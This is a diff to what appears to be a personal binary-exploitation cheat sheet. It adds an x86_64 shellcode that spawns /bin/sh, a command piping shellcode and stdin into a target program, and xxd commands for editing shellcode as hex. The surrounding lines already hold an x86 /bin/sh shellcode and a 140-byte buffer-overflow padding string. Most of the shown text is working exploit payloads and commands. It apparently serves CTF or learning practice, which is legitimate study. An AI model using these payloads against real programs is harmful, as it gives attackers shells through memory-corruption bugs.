@@ -6,6 +6,12 @@ ____ _  _ ___  _    ____ _ ___ ____
 |___  \/  |__] |    |  | |  |  [__  
 |___ _/\_ |    |___ |__| |  |  ___] 
 
+#pipe shellcode and stdin to program
+cat shellcode - | ./program
+
+#x86_64 shellcode /bin/sh
+\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+
 #86 shellcode sh? bash?
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
 _  _ ___ _ _    ____ 
@@ -24,6 +30,13 @@ $(python -c 'print "A" * 140')
 #find length of shell code
 python -c 'print len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")'
 output: 24
+
+#xxd tricks
+#convert file to hexdump
+xxd shellcode > shellcode.hex
+
+#convert modifiy hex back to binary
+xxd -r shellcode.hex > shellcode
 ____ ___  ___  
 | __ |  \ |__] 
 |__] |__/ |__] 
